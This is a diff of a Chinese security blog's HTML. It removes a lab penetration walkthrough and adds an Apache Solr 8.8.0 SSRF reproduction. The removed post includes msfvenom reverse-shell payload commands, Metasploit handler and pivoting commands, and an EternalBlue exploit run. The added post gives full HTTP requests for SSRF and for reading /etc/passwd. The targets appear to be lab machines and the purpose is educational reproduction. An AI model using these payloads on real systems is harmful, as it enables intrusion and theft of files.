@@ -4,10 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一次靶机测试, Danie1&#39;s Blog">
-    <meta name="description" content="一次靶机测试环境攻击机kali  net模式： 192.168.74.133
-网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128
-编程采集靶机 仅主机模式：192.168.110">
+    <meta name="keywords" content="Apache Solr   SSRF漏洞复现, Danie1&#39;s Blog">
+    <meta name="description" content="Apache Solr   SSRF漏洞复现使用docker搭建solr 8.8.0环境。
+
+发送请求，请求包如下：
+POST /solr/test1/config HTTP/1.1
+Host: 192.168.74.132:8983
+Us">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +18,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>一次靶机测试 | Danie1&#39;s Blog</title>
+    <title>Apache Solr   SSRF漏洞复现 | Danie1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -261,12 +264,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/24.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一次靶机测试</h1>
+                    <h1 class="description center-align post-title">Apache Solr   SSRF漏洞复现</h1>
                 </div>
             </div>
         </div>
@@ -383,8 +386,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">渗透</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
+                            </a>
+                        
+                            <a href="/tags/SSRF/">
+                                <span class="chip bg-color">SSRF</span>
                             </a>
                         
                     </div>
@@ -395,8 +402,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
-                                渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
                             </a>
                         
                     </div>
@@ -408,7 +415,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-06
+                    2021-03-18
                 </div>
                 
 
@@ -425,76 +432,56 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="一次靶机测试"><a href="#一次靶机测试" class="headerlink" title="一次靶机测试"></a>一次靶机测试</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机kali  net模式： 192.168.74.133</p>
-<p>网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128</p>
-<p>编程采集靶机 仅主机模式：192.168.110.129</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>熊海cms，存在sql注入。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/1.png"></p>
-<p>通过前台sql注入可以拿到管理员账户密码。（这个靶机sql注入没办法直接shell，只能读取账户密码）</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g2.png"></p>
-<p>登录进入后台。发布内容-发布文章。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g3.png"></p>
-<p>这里我尝试上传，不回显地址。找不到上传文件（我在靶机里翻了半天也没找到）</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g4.png"></p>
-<p>通过下方编辑器的上传图片功能，但是做了白名单限制，无法传php。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g5.png"></p>
-<p>无法上传php，返回文件类型不允许。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g6.png"></p>
-<p>但是翻看熊海cms的源码，发现index.php存在文件包含。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g7.jpg"></p>
-<p>但是会自动加上php后缀，但是可以加“.”绕过。所以通过编辑器里的上传图片功能上传图片马。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g8.png"></p>
-<p>通过首页去包含图片马。Payload如下</p>
-<p><code>http://192.168.74.139/iseaCMS_1.0/?r=../../upload/image/20210106/1609921687112812.gif........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/g9.png"></p>
-<p>菜刀连接。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210108151710.png"></p>
-<p>横向，发现是双网卡。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108152352.png"></p>
-<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>先生成shell.php</p>
-<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.74.133 LPORT=2222 -f raw &gt;shell.php</code></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108100933.png"></p>
-<p>通过菜刀上传到目标服务器。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101116.png"></p>
-<p>攻击机开启msf，设置监听。</p>
-<pre><code class="txt">use exploit/multi/handler
-set payload php/meterpreter/reverse_tcp
-set lhost 192.168.74.133
-set lport 2222
-exploit -j</code></pre>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101228.png"></p>
-<p>然后浏览器访问shell.php，msf接收到反弹回来的shell。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108101539.png"></p>
-<p>在后面的添加路由中，发现php的马并不好用。改用exe马</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.74.133 LPORT=4444 -f exe -o test.exe</code></p>
-<pre><code class="txt">use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.74.133
-set LPORT 4444
-exploit -j</code></pre>
-<p> 获取内网网段信息</p>
-<pre><code>meterpreter &gt; run get_local_subnets</code></pre>
-<p>添加路由</p>
-<p><code>run autoroute -s 192.168.110.0/24</code> </p>
-<p>查看路由情况</p>
-<p><code>run autoroute -p</code></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108144115.png"></p>
-<p>路由添加成功后，去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p>
-<p>扫描ms17-010</p>
-<pre><code class="txt">use auxiliary/scanner/smb/smb_ms17_010 
-show options
-set rhosts 192.168.110.0/24
-set threads 50
-run</code></pre>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E5%9B%BE%E7%89%8720210108144511.jpg"></p>
-<p>通过主机漏洞扫描，我们发现192.168.110.129主机存在一个MS17-010漏洞。</p>
-<p>执行攻击载荷</p>
-<pre><code>use exploit/windows/smb/ms17_010_eternalblue 
-set rhost 192.168.110.129
-exploit</code></pre>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108143835.png"></p>
-<p>ms17-010打了好多次才成功拿下这台机器。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20210108144730.png"></p>
+                <h1 id="Apache-Solr-SSRF漏洞复现"><a href="#Apache-Solr-SSRF漏洞复现" class="headerlink" title="Apache Solr   SSRF漏洞复现"></a>Apache Solr   SSRF漏洞复现</h1><p>使用docker搭建solr 8.8.0环境。</p>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210318102731.png"></p>
+<p>发送请求，请求包如下：</p>
+<pre><code class="txt">POST /solr/test1/config HTTP/1.1
+Host: 192.168.74.132:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: Content-Type: application/json
+Content-Length: 80
+
+&#123;&quot;set-property&quot;:&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210318095648.png"></p>
+<p>SSRF ：</p>
+<pre><code class="txt">POST /solr/test1/debug/dump?param=ContentStreams HTTP/1.1
+Host: 192.168.74.132:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+stream.url=http://dnslog.cn</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210318190245.png"></p>
+<p>文件读取poc:</p>
+<pre><code class="txt">POST /solr/test1/debug/dump?param=ContentStreams HTTP/1.1
+Host: 192.168.74.132:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+stream.url=file:///etc/passwd</code></pre>
+<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210318095839.png"></p>
 
             </div>
             <hr/>
@@ -520,7 +507,7 @@ exploit</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://danie1233.github.io/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">https://danie1233.github.io/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/</a>
+                    <a href="https://danie1233.github.io/2021/03/18/Apache%20Solr%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://danie1233.github.io/2021/03/18/Apache%20Solr%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -558,8 +545,12 @@ exploit</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">渗透</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
+                                </a>
+                            
+                                <a href="/tags/SSRF/">
+                                    <span class="chip bg-color">SSRF</span>
                                 </a>
                             
                         </div>
@@ -600,9 +591,10 @@ exploit</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/18/Apache%20Solr%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
@@ -625,9 +617,9 @@ Us
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -640,6 +632,7 @@ Us
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -662,34 +655,33 @@ Us
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/02/02/Apache%20Druid%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+                <a href="/2021/03/06/%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Apache Druid 远程命令执行漏洞复现">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="一次靶机测试">
                         
-                        <span class="card-title">Apache Druid 远程命令执行漏洞复现</span>
+                        <span class="card-title">一次靶机测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Apache Druid 远程命令执行漏洞复现
-使用docker搭建环境
-docker pull fokkodriesprong/docker-druid
-docker run --rm -i -p 8888:8888 fokkodries
+                            一次靶机测试环境攻击机kali  net模式： 192.168.74.133
+网站靶机 双网卡  net模式： 192.168.74.139    仅主机模式：192.168.110.128
+编程采集靶机 仅主机模式：192.168.110
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-06
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
@@ -699,12 +691,8 @@ docker run --rm -i -p 8888:8888 fokkodries
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-                        <span class="chip bg-color">命令执行</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
                     </a>
                     
                 </div>
